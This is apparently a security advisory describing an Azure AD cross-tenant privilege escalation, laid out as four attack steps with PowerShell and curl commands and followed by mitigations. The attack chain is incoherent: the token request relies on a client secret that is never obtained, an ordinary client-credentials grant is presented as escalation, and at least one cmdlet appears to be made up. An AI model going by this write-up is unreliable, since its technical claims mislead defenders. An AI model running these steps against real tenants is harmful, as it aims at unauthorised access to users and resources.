# Azure AD Privilege Escalation via Cross-Tenant Trust

**Date:** 2024-09-15
**Severity:** High
**Affected:** Azure Active Directory cross-tenant configurations

## Summary

Discovered a privilege escalation path in Azure AD cross-tenant guest access configurations that allows an attacker with a low-privilege guest account to enumerate and potentially access resources in the host tenant.

## Environment

- Azure AD with cross-tenant guest access enabled
- Guest user with `Directory.Read.All` application permission
- Host tenant with default B2B collaboration settings

## Attack Path

### Step 1: Guest Account Enumeration

Starting with a basic guest account, enumerate available scopes:

```powershell
# Connect as guest user
Connect-AzAccount -TenantId <guest-tenant>

# Enumerate cross-tenant access settings
Get-AzADCrossTenantAccessProfile
```

### Step 2: Application Permission Abuse

Identify applications with overly permissive cross-tenant settings:

```powershell
# List applications with cross-tenant access
Get-AzADApplication | Where-Object {
    $_.OptionalClaims -ne $null -and
    $_.OptionalClaims.AccessToken -ne $null
}
```

### Step 3: Token Manipulation

Request access tokens with elevated scopes by exploiting misconfigured API permissions:

```bash
# Request token with broader scope than intended
curl -X POST https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token \
  -d "client_id=<app-id>" \
  -d "client_secret=<secret>" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "grant_type=client_credentials"
```

### Step 4: Resource Access

Use the manipulated token to access host tenant resources:

```powershell
# Access Graph API with elevated permissions
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" `
  -Headers @{ Authorization = "Bearer $token" }
```

## Impact

- Enumeration of host tenant users and groups
- Potential access to shared resources
- Lateral movement between tenants

## Mitigation

1. Review cross-tenant access policies regularly
2. Implement least-privilege principles for guest accounts
3. Monitor authentication logs for unusual token requests
4. Use conditional access policies to restrict guest access

## Tools Used

- PowerShell Az modules
- Microsoft Graph API
- Custom enumeration scripts

## References

- [Azure AD Cross-Tenant Access](https://docs.microsoft.com/azure/active-directory/b2b/cross-tenant-access)
- [Microsoft Graph API Permissions](https://docs.microsoft.com/graph/permissions-reference)